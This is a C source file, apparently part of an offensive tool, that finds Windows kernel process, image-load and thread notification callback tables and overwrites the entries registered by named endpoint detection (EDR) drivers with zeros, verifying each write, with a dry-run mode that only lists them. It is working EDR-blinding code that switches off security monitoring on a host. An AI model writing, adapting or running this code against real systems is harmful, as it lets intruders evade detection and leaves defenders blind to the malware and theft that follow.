#include "ft.h"

#include <string.h>

static int g_edr_nullify = 0;

void ft_edr_set_nullify(int on) { g_edr_nullify = on ? 1 : 0; }
int ft_edr_nullify_enabled(void) { return g_edr_nullify; }

#define FT_CB_PER_DRIVER 32
#define FT_CB_MAX_DRIVERS 32
#define FT_CB_MAX_TABLE  64

typedef struct ft_target {
    const char* name;
    uint64_t    base;
    ft_range    exec;
    int         hits;
} ft_target;

static uint16_t rd16k(const uint8_t* p) { return (uint16_t)(p[0] | (p[1] << 8)); }
static uint32_t rd32k(const uint8_t* p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static int ft_driver_exec_range(ft_ctx* c, uint64_t base, ft_range* out) {
    uint8_t hdr[0x1000];
    uint32_t e_lfanew;
    uint16_t nsec;
    uint16_t size_opt;
    size_t sec_off;
    uint32_t i;
    int found = 0;

    if (ft_km_read_bytes(c, base, hdr, sizeof hdr) == FTR_FAIL) return 0;
    if (hdr[0] != 'M' || hdr[1] != 'Z') return 0;
    e_lfanew = rd32k(hdr + 0x3C);
    if (e_lfanew < 0x40 || e_lfanew + 0x18 > sizeof hdr) return 0;
    if (!(hdr[e_lfanew] == 'P' && hdr[e_lfanew + 1] == 'E')) return 0;
    if (rd16k(hdr + e_lfanew + 0x18) != 0x20B) return 0;
    size_opt = rd16k(hdr + e_lfanew + 0x14);
    if (size_opt < 0xF0) return 0;
    nsec = rd16k(hdr + e_lfanew + 0x18 + 0x84);
    sec_off = (size_t)e_lfanew + 0x18 + size_opt;
    if (sec_off + (size_t)nsec * 40 > sizeof hdr) return 0;

    out->lo = 0;
    out->hi = 0;
    for (i = 0; i < nsec && i < 32; i++) {
        const uint8_t* s = hdr + sec_off + (size_t)i * 40;
        uint32_t vsize = rd32k(s + 8);
        uint32_t va = rd32k(s + 12);
        uint32_t flags = rd32k(s + 36);
        if (!(flags & 0x20000000u)) continue;
        if (vsize == 0) vsize = 0x1000;
        if (!found) { out->lo = base + va; found = 1; }
        else if (base + va < out->lo) out->lo = base + va;
        if (base + va + vsize > out->hi) out->hi = base + va + vsize;
    }
    return found;
}

static int ft_lea_target(const uint8_t* buf, size_t raw, uint32_t section_va,
                         size_t k, uint64_t* out) {
    size_t ilen;
    int32_t disp;
    uint8_t modrm;

    if (k + 7 > raw) return 0;
    if (buf[k] == 0x48 || buf[k] == 0x4C) {
        if (buf[k + 1] != 0x8D) return 0;
        modrm = buf[k + 2];
        if ((modrm & 0xC7u) != 0x05u) return 0;
        disp = (int32_t)rd32k(buf + k + 3);
        ilen = 7;
    } else if (buf[k] == 0x8D) {
        modrm = buf[k + 1];
        if ((modrm & 0xC7u) != 0x05u) return 0;
        disp = (int32_t)rd32k(buf + k + 2);
        ilen = 6;
    } else {
        return 0;
    }
    *out = (uint64_t)(int64_t)((int64_t)section_va + (int64_t)k + (int64_t)ilen + disp);
    return 1;
}

typedef struct ft_cand {
    uint64_t addr;
} ft_cand;

static int ft_collect_lea(ft_ctx* c, const char* symbol, ft_cand* out, int max) {
    uint32_t rva = 0;
    uint8_t code[0x100];
    uint32_t i;
    int n = 0;

    if (!ft_ntos_export_rva(c, symbol, &rva) || rva == 0) return 0;
    if (!ft_ntos_rva_bytes(c, rva, code, sizeof code)) return 0;

    for (i = 0; i < 2; i++) {
        int32_t disp;
        if (code[0] != 0xE9u) break;
        disp = (int32_t)rd32k(code + 1);
        rva = (uint32_t)((int64_t)rva + 5 + disp);
        if (!ft_ntos_rva_bytes(c, rva, code, sizeof code)) return 0;
    }

    for (i = 0; i + 7 <= sizeof code && n < max; i++) {
        uint64_t target = 0;
        if (!ft_lea_target(code, sizeof code, rva, i, &target)) continue;
        if (target < 0xFFFF000000000000ULL) continue;
        out[n].addr = target;
        n++;
    }
    if (n == 0) {

        ft_info(c, "edrcb_no_lea", "\"symbol\":\"%s\",\"rva\":\"0x%x\"",
                symbol, rva);
    }
    return n;
}

static int ft_entry_plausible(uint64_t fn, uint64_t ctx) {
    if (!ft_is_kernel_ptr(fn)) return 0;
    if (fn & 0xF) return 0;
    if (ctx != 0 && !ft_is_kernel_ptr(ctx)) return 0;
    return 1;
}

static int ft_in_any_exec(const ft_target* t, int n, uint64_t v) {
    int i;
    for (i = 0; i < n; i++) {
        if (v >= t[i].exec.lo && v < t[i].exec.hi) return i;
    }
    return -1;
}

int ft_edr_callbacks(ft_ctx* c, const char* const* drivers, int n) {
    static const char* setters[] = {
        "PsSetCreateProcessNotifyRoutine",
        "PsSetLoadImageNotifyRoutine",
        "PsSetCreateThreadNotifyRoutine",
        NULL
    };
    ft_target targets[FT_CB_MAX_DRIVERS];
    int nt = 0;
    int i;
    int total = 0;
    ft_sb f;

    if (!c || !drivers || n <= 0) return FT_E_ARGS;

    for (i = 0; i < n && nt < FT_CB_MAX_DRIVERS; i++) {
        uint64_t base = 0, size = 0;
        memset(&targets[nt], 0, sizeof targets[nt]);
        targets[nt].name = drivers[i];
        if (!ft_mod_range(c, drivers[i], &base, &size) || !base) {
            ft_info(c, "edrcb_driver_absent", "\"name\":\"%s\"", drivers[i]);
            continue;
        }
        targets[nt].base = base;
        if (!ft_driver_exec_range(c, base, &targets[nt].exec)) {
            targets[nt].exec.lo = base;
            targets[nt].exec.hi = base + (size ? size : 0x40000);
            ft_warn(c, "edrcb_no_sections_drv", "\"name\":\"%s\"", drivers[i]);
        }
        nt++;
    }
    if (nt == 0) {
        ft_info(c, "edrcb_no_targets", "\"requested\":%d", n);
        return FT_OK;
    }
    ft_info(c, "edrcb_targets", "\"count\":%d", nt);

    for (i = 0; setters[i]; i++) {
        ft_cand cands[FT_CB_MAX_TABLE];
        int nc = ft_collect_lea(c, setters[i], cands, FT_CB_MAX_TABLE);
        int k;

        if (nc == 0) {
            ft_warn(c, "edrcb_no_setter", "\"symbol\":\"%s\"", setters[i]);
            continue;
        }
        for (k = 0; k < nc; k++) {
            uint64_t slot = cands[k].addr;
            int e;
            int valid = 0;

            for (e = 0; e < FT_CB_MAX_TABLE; e++) {
                uint64_t fn = 0, ctx = 0;
                uint64_t at = slot + (uint64_t)e * 16;
                if (at & 0xF) break;
                if (ft_km_read64(c, at, &fn) != FTR_VAL) break;
                if (ft_km_read64(c, at + 8, &ctx) != FTR_VAL) break;
                if (!ft_entry_plausible(fn, ctx)) break;
                valid++;
            }
            if (valid == 0) continue;

            ft_info(c, "edrcb_table",
                    "\"symbol\":\"%s\",\"table\":\"0x%llx\",\"entries\":%d",
                    setters[i], (unsigned long long)slot, valid);

            for (e = 0; e < valid; e++) {
                uint64_t at = slot + (uint64_t)e * 16;
                uint64_t fn = 0, ctx = 0;
                int which;

                if (ft_km_read64(c, at, &fn) != FTR_VAL) continue;
                if (ft_km_read64(c, at + 8, &ctx) != FTR_VAL) continue;
                which = ft_in_any_exec(targets, nt, fn);
                if (which < 0) continue;

                targets[which].hits++;
                if (targets[which].hits > FT_CB_PER_DRIVER) {
                    ft_warn(c, "edrcb_cap_reached", "\"name\":\"%s\"",
                            targets[which].name);
                    break;
                }
                if (c->dry_run || !ft_edr_nullify_enabled()) {
                    ft_ok(c, "edrcb_candidate",
                          "\"name\":\"%s\",\"table\":\"0x%llx\",\"slot\":\"0x%llx\",\"fn\":\"0x%llx\"",
                          targets[which].name, (unsigned long long)slot,
                          (unsigned long long)at, (unsigned long long)fn);
                    continue;
                }
                if (ft_km_write64(c, at, 0) != 1) {
                    ft_err(c, "edrcb_write_failed",
                           "\"name\":\"%s\",\"slot\":\"0x%llx\"",
                           targets[which].name, (unsigned long long)at);
                    continue;
                }
                {
                    uint64_t back = 0xFFFFFFFFFFFFFFFFull;
                    ft_km_read64(c, at, &back);
                    if (back != 0) {
                        ft_err(c, "edrcb_verify_failed",
                               "\"name\":\"%s\",\"slot\":\"0x%llx\"",
                               targets[which].name, (unsigned long long)at);
                    } else {
                        total++;
                        ft_ok(c, "edrcb_nullified",
                              "\"name\":\"%s\",\"symbol\":\"%s\",\"slot\":\"0x%llx\",\"fn\":\"0x%llx\"",
                              targets[which].name, setters[i],
                              (unsigned long long)at, (unsigned long long)fn);
                    }
                }
            }
        }
    }

    for (i = 0; i < nt; i++) {
        ft_sb_init(&f);
        ft_sb_addf(&f, "\"name\":\"%s\",\"base\":\"0x%llx\",\"exec_lo\":\"0x%llx\",\"exec_hi\":\"0x%llx\",\"hits\":%d",
                   targets[i].name, (unsigned long long)targets[i].base,
                   (unsigned long long)targets[i].exec.lo,
                   (unsigned long long)targets[i].exec.hi, targets[i].hits);
        ft_info(c, "edrcb_driver_done", f.buf);
        ft_sb_free(&f);
    }

    ft_sb_init(&f);
    ft_sb_addf(&f, "\"nullified\":%d,\"drivers\":%d", total, nt);
    ft_ok(c, "edrcb_done", f.buf);
    ft_sb_free(&f);
    return FT_OK;
}
